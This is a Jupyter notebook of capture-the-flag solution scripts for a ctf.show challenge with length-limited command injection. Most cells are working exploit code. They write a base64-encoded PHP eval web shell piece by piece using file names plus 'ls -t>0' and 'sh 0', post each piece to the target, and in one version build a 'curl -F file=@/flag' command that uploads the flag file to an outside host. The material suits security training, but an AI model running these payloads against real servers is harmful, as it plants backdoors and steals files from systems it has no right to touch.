{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "#### 7字符\n",
    "- 写入语句   \n",
    "```<?php eval($_GET[1]);```   \n",
    "- base64编码后   \n",
    "PD9waHAgZXZhbCgkX0dFVFsxXSk7\n",
    "- 需要被执行的语句：   \n",
    "echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import urllib\n",
    "pl = r'''>hp\n",
    ">1.p\\\\\n",
    ">d\\>\\\\\n",
    ">\\ -\\\\\n",
    ">e64\\\\\n",
    ">bas\\\\\n",
    ">7\\|\\\\\n",
    ">XSk\\\\\n",
    ">Fsx\\\\\n",
    ">dFV\\\\\n",
    ">kX0\\\\\n",
    ">bCg\\\\\n",
    ">XZh\\\\\n",
    ">AgZ\\\\\n",
    ">waH\\\\\n",
    ">PD9\\\\\n",
    ">o\\ \\\\\n",
    ">ech\\\\\n",
    "ls -t>0\n",
    "sh 0'''.splitlines()\n",
    "import requests\n",
    "url= 'http://c3819b2b-9e09-4a8b-88c5-e43ce2b37932.challenge.ctf.show/api/tools.php'\n",
    "for i in pl:\n",
    "    data = {'cmd':urllib.parse.unquote(i.strip())}\n",
    "    print(requests.post(url,data=data).text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "#### 5字符"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "# x = ls - t >g\n",
    "ls_t ='''>sl\n",
    ">ht-\n",
    ">g\\>\n",
    ">dir\n",
    "*>v\n",
    ">rev\n",
    "*v>x'''.splitlines()\n",
    "\n",
    "\n",
    "#<?php eval($_GET[1]);\n",
    "cmd = 'echo\\\\ D9waHAgZXZhbCgkX0dFVFsxXSk7\\\\|base64 \\\\\\t-d\\\\>1.php '\n",
    "cmdlist=[]\n",
    "cmdd = set()\n",
    "for i in range(1,len(cmd),2):\n",
    "    x = '>'+cmd[-i-2:-i]+\"\\\\\"\n",
    "    cmdlist.append(x)\n",
    "    cmdd.add(x)\n",
    "for i in range(len(cmdlist)):\n",
    "    print(cmdlist[-i-1],end=' ')\n",
    "print()\n",
    "print(len(cmdlist),len(cmdd))\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "#### 羽大佬版本"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "pl ='''>dir\n",
    ">f\\>\n",
    ">ht-\n",
    ">sl\n",
    "*>v\n",
    ">rev\n",
    "*v>0\n",
    ">a\n",
    ">hp\n",
    ">p\\\\\n",
    ">2.\\\\\n",
    ">\\>\\\\\n",
    ">-d\\\\\n",
    ">\\%09\\\\\n",
    ">64\\\\\n",
    ">se\\\\\n",
    ">ba\\\\\n",
    ">\\|\\\\\n",
    ">7\\\\\n",
    ">Sk\\\\\n",
    ">X\\\\\n",
    ">x\\\\\n",
    ">Fs\\\\\n",
    ">FV\\\\\n",
    ">d\\\\\n",
    ">X0\\\\\n",
    ">k\\\\\n",
    ">g\\\\\n",
    ">bC\\\\\n",
    ">h\\\\\n",
    ">XZ\\\\\n",
    ">gZ\\\\\n",
    ">A\\\\\n",
    ">aH\\\\\n",
    ">w\\\\\n",
    ">D9\\\\\n",
    ">P\\\\\n",
    ">\\ \\\\\n",
    ">o\\\\\n",
    ">ch\\\\\n",
    ">e\\\\\n",
    "sh 0\n",
    "sh f'''.splitlines()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import urllib.parse\n",
    "url = \"http://c3819b2b-9e09-4a8b-88c5-e43ce2b37932.challenge.ctf.show//api/tools.php\"\n",
    "print(\"[+]start attack!!!\")\n",
    "for i in pl:\n",
    "    data = {'cmd':i}\n",
    "    print(\"[*]\" + url.format(i.strip()))\n",
    "    print(requests.get(url.format(urllib.parse.unquote(i.strip()))))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "#### 7字符第二版"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "echo Y3VybCAtRiBmaWxlPUAvZmxhZyBodHRwOi8vM2FlN2EyMTgtMDM1Yi00ZGZhLWI0NmEtYjI1N2Y3ZWJjNmIxLmNoYWxsZW5nZS5jdGYuc2hvdy8g|base64 -d>1\n",
      ">\\>1\n",
      ">\\ -d\\\\\n",
      ">se64\\\\\n",
      ">\\|ba\\\\\n",
      ">8g\\\\\n",
      ">hvdy\\\\\n",
      ">Yuc2\\\\\n",
      ">5jdG\\\\\n",
      ">5nZS\\\\\n",
      ">xsZW\\\\\n",
      ">NoYW\\\\\n",
      ">IxLm\\\\\n",
      ">JjNm\\\\\n",
      ">Y3ZW\\\\\n",
      ">I1N2\\\\\n",
      ">EtYj\\\\\n",
      ">I0Nm\\\\\n",
      ">ZhLW\\\\\n",
      ">00ZG\\\\\n",
      ">M1Yi\\\\\n",
      ">gtMD\\\\\n",
      ">EyMT\\\\\n",
      ">FlN2\\\\\n",
      ">8vM2\\\\\n",
      ">RwOi\\\\\n",
      ">BodH\\\\\n",
      ">xhZy\\\\\n",
      ">AvZm\\\\\n",
      ">xlPU\\\\\n",
      ">BmaW\\\\\n",
      ">AtRi\\\\\n",
      ">VybC\\\\\n",
      ">\\ Y3\\\\\n",
      ">echo\\\\\n",
      "ls -t>0\n",
      "sh 0\n",
      "sh 1\n"
     ]
    }
   ],
   "source": [
    "shell = \"curl -F file=@/flag http://3ae7a218-035b-4dfa-b46a-b257f7ebc6b1.challenge.ctf.show/\"\n",
    "\n",
    "''' #接收\n",
    "shell = \"curl -F file=@/flag http://xx\"\n",
    "move_uploaded_file($_FILES['file']['tmp_name'],'txt');\n",
    "echo file_get_contents('txt');\n",
    "'''\n",
    "\n",
    "def makshell_7(shell):\n",
    "    import base64 \n",
    "    shellb = base64.b64encode(shell.encode()).decode()\n",
    "    while shellb[-1]=='=':\n",
    "        shell +=' '\n",
    "        shellb = base64.b64encode(shell.encode()).decode()\n",
    "    \n",
    "    shell = f'echo {shellb}|base64 -d>1'\n",
    "    print(shell)\n",
    "    def addslash(shell ,chrs=\"\\\\ $+'|>\\\"\"):\n",
    "        for i in chrs:\n",
    "            shell=shell.replace(i, '\\\\'+i)\n",
    "        return shell\n",
    "    shell = addslash(shell)\n",
    "    slist=['sh 1','sh 0','ls -t>0']\n",
    "    tmp = '>'\n",
    "    for i in range(len(shell)) :\n",
    "        if (len(shell)>i+1 and shell[i+1]== '\\\\') or len(tmp) >= 4:\n",
    "            slist.append(tmp+shell[i]+r'\\\\')\n",
    "            tmp='>'\n",
    "        else:\n",
    "            tmp += shell[i]\n",
    "    else:\n",
    "        if '>' == tmp :\n",
    "            slist[-1]=slist[-1][:-2]\n",
    "        else :\n",
    "            slist.append(tmp)\n",
    "    return slist[::-1]\n",
    "url = 'http://37fadebb-2b06-42da-8030-67df9db79d22.challenge.ctf.show/api/tools.php'\n",
    "import requests\n",
    "import time\n",
    "for i in makshell_7(shell):\n",
    "    data = {'cmd':i}\n",
    "    # print( requests.post(url,data=data).text )\n",
    "    # time.sleep(0.5)\n",
    "    print(i)\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
